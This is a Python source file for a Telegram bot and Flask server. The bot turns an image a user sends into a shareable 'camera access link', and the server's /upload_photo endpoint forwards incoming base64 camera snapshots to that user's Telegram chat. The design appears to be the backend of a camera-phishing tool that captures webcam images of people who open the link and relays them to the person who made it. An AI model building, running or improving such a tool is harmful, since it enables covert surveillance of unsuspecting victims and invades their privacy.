import os
import sqlite3
import base64
import re
from io import BytesIO
from threading import Thread
from dotenv import load_dotenv
from pathlib import Path
from flask import Flask, request, jsonify
import requests

from telegram import Bot, Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, ContextTypes, filters

# ---------------------------
# Load .env variables
# ---------------------------
# Load .env from the same directory as this script (explicit path)
env_path = Path(__file__).parent / '.env'
load_dotenv(dotenv_path=env_path)
print("DEBUG .env path:", env_path)
print("DEBUG .env exists:", env_path.exists())
# Try to read BOT_TOKEN from environment. If not present, try a manual .env parse as a fallback.
BOT_TOKEN = os.getenv("BOT_TOKEN")  # ✅ Use the variable name, not the token value
if not BOT_TOKEN and env_path.exists():
    try:
        with open(env_path, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith('#'):
                    continue
                if line.startswith('BOT_TOKEN='):
                    _, val = line.split('=', 1)
                    val = val.strip().strip('"').strip("'")
                    if val:
                        os.environ['BOT_TOKEN'] = val
                        BOT_TOKEN = val
                        break
    except Exception:
        pass

# Masked token for safe debug output (don't print the full token)
def _mask_token(tkn: str) -> str:
    if not tkn:
        return '<missing>'
    if len(tkn) <= 10:
        return tkn[:4] + '...' + tkn[-2:]
    return tkn[:4] + '...' + tkn[-4:]
# Your live website URL
HOST_URL = os.getenv("HOST_URL", "http://shareimage.42web.io")

print("DEBUG BOT_TOKEN:", _mask_token(BOT_TOKEN))  # 👈 For debugging (masked)
print("DEBUG HOST_URL (raw):", HOST_URL)

# Server-side path where the web server serves uploads
# Update this to your actual XAMPP path. Use double-backslashes on Windows.
WEB_UPLOAD_DIR = os.getenv('WEB_UPLOAD_DIR', r"c:\xampp\htdocs\my shop\uploads")
os.makedirs(WEB_UPLOAD_DIR, exist_ok=True)

# Normalize HOST_URL: keep scheme, netloc and path (so if HOST_URL is http://localhost/my_shop
# the path is preserved). Remove any trailing slash.
from urllib.parse import urlparse, urlunparse
parsed = urlparse(HOST_URL)
scheme = parsed.scheme or 'http'
netloc = parsed.netloc
path = parsed.path.rstrip('/') if parsed.path else ''
if not netloc:
    # If user provided something like 'localhost/my_shop' without scheme, try to parse
    parts = HOST_URL.split('/', 1)
    netloc = parts[0]
    path = '/' + parts[1].rstrip('/') if len(parts) > 1 else ''
HOST_URL_CLEAN = scheme + '://' + netloc + path
print("DEBUG HOST_URL_CLEAN:", HOST_URL_CLEAN)

if not BOT_TOKEN:
    raise ValueError("❌ BOT_TOKEN not found. Please add it to your .env file!")

# ---------------------------
# SQLite database
# ---------------------------
DB_PATH = "sessions.db"
conn = sqlite3.connect(DB_PATH, check_same_thread=False)
c = conn.cursor()
c.execute('''CREATE TABLE IF NOT EXISTS user_sessions
             (user_id INTEGER, session_id TEXT PRIMARY KEY, original_image TEXT)''')
conn.commit()

# ---------------------------
# Flask app setup
# ---------------------------
flask_app = Flask(__name__)
bot = Bot(token=BOT_TOKEN)

@flask_app.route("/upload_photo", methods=["POST"])
def upload_photo():
    """
    Expects JSON: { "session": "<session_id>", "image": "data:image/jpeg;base64,..." }
    """
    data = request.get_json(silent=True)
    if not data:
        return jsonify({"ok": False, "error": "invalid json"}), 400

    session = data.get("session")
    image_data = data.get("image")

    if not session or not image_data:
        return jsonify({"ok": False, "error": "missing fields"}), 400

    # Find user_id from the session
    c.execute("SELECT user_id FROM user_sessions WHERE session_id = ?", (session,))
    row = c.fetchone()
    if not row:
        return jsonify({"ok": False, "error": "invalid session"}), 404

    user_id = row[0]

    # Parse and decode base64 image
    m = re.match(r"data:(image/[^;]+);base64,(.*)$", image_data)
    if not m:
        return jsonify({"ok": False, "error": "invalid image data"}), 400

    mime, b64 = m.group(1), m.group(2)
    try:
        image_bytes = base64.b64decode(b64)
    except Exception as e:
        return jsonify({"ok": False, "error": "base64 decode failed", "detail": str(e)}), 400

    bio = BytesIO(image_bytes)
    bio.name = "snapshot.jpg"

    try:
        bot.send_photo(chat_id=int(user_id), photo=bio, caption="📸 New snapshot from camera link")
    except Exception as e:
        return jsonify({"ok": False, "error": "telegram send failed", "detail": str(e)}), 500

    return jsonify({"ok": True})

def run_flask():
    flask_app.run(host="0.0.0.0", port=5000, debug=False)

# ---------------------------
# Telegram bot setup
# ---------------------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("📸 Send me an image and I'll create a camera access link!")

async def image_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        # Get the largest photo size
        photo = update.message.photo[-1]
        file = await context.bot.get_file(photo.file_id)

        # Create unique filename using timestamp and user ID
        import time, secrets
        timestamp = int(time.time())
        filename = f"image_{update.effective_user.id}_{timestamp}.jpg"

        # Ensure web uploads directory exists and save into it
        os.makedirs(WEB_UPLOAD_DIR, exist_ok=True)
        file_path = os.path.join(WEB_UPLOAD_DIR, filename)

        # Download the image to the web uploads folder
        await file.download_to_drive(file_path)

        # Default public URL (assumes uploads folder on host)
        image_url = f"{HOST_URL_CLEAN}/uploads/{filename}"

        # Try uploading the file to the remote website (home.php). If the host returns JSON
        # with a file_url we use that. Otherwise we fall back to the default URL and create
        # a local DB entry so you still get a short link locally.
        uploaded_remote = False
        upload_error = None
        try:
            with open(file_path, 'rb') as fh:
                files = {'image': (filename, fh)}
                resp = requests.post(f"{HOST_URL_CLEAN}/home.php", files=files, timeout=30)
            if resp.ok:
                try:
                    j = resp.json()
                    if j.get('success') and j.get('file_url'):
                        image_url = j.get('file_url')
                        uploaded_remote = True
                except Exception:
                    # Non-JSON or missing fields; keep fallback image_url
                    uploaded_remote = False
        except Exception as e:
            upload_error = str(e)
            uploaded_remote = False

        if not uploaded_remote:
            # Create a local short link (stored in local sessions.db). Note: if HOST_URL points
            # to a remote host, that host won't know about this local DB; the local short link
            # may not work externally unless the host and this DB are the same.
            short_id = secrets.token_urlsafe(8)
            c.execute("INSERT OR REPLACE INTO user_sessions (user_id, session_id, original_image) VALUES (?, ?, ?)",
                      (update.effective_user.id, short_id, image_url))
            conn.commit()
            short_url = f"{HOST_URL_CLEAN}/i/{short_id}"
        else:
            # For remote-hosted flow, use the remote file URL as the share link
            short_url = image_url

        # Create inline keyboard with the links
        keyboard = [
            [InlineKeyboardButton("Share Link", url=short_url)],
            [InlineKeyboardButton("Direct Image Link", url=image_url)]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)

        # Send response to user
        if uploaded_remote:
            await update.message.reply_text(
                f"✅ Image uploaded to host successfully!\n\n"
                f"🔗 Link: {image_url}\n\n",
                reply_markup=reply_markup
            )
        else:
            # include upload error if available
            err_text = f"\n(Upload to host failed: {upload_error})" if upload_error else ""
            await update.message.reply_text(
                f"⚠️ Remote upload failed. A local link was created (may not be accessible publicly).\n\n"
                f"Local Link: {short_url}\n"
                f"Direct (assumed) URL: {image_url}{err_text}\n\n",
                reply_markup=reply_markup
            )
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

def run_telegram_bot():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.PHOTO, image_handler))
    print("🤖 Telegram bot running...")
    app.run_polling()

# ---------------------------
# Main runner
# ---------------------------
if __name__ == "__main__":
    Thread(target=run_flask, daemon=True).start()
    run_telegram_bot()